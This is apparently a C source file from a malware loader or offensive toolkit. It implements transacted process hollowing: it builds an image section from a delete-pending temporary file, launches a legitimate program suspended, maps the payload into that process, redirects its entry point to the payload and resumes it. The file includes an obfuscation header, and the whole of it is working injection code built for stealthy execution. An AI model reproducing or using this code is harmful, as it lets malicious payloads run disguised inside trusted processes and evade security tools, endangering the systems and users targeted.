#include "inject.h"

#include "..\ntddk.h"
#include "..\utils.h"
#include "..\common.h"
#include "..\obfuscatew.h"

#include "hollowing_parts.h"
#include "delete_pending_file.h"

#include <wchar.h>

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = UtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status != STATUS_IMAGE_NOT_AT_BASE) {
            return NULL;
        }
    }
    return sectionBaseAddress;
}

HANDLE transacted_hollowing(wchar_t* tmpFile, wchar_t* programPath, wchar_t* cmdLine, BYTE* payladBuf, DWORD payloadSize, wchar_t* startDir)
{
    HANDLE hSection = make_section_from_delete_pending_file(tmpFile, payladBuf, payloadSize);

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }

    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED);
    if (pi.hProcess == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }

    PVOID remote_base = map_buffer_into_process(pi.hProcess, hSection);
    if (!remote_base) {
        return INVALID_HANDLE_VALUE;
    }

    if (!redirect_to_payload(payladBuf, remote_base, pi)) {
        return INVALID_HANDLE_VALUE;
    }

    UtResumeThread(pi.hThread, NULL);
    return pi.hProcess;
}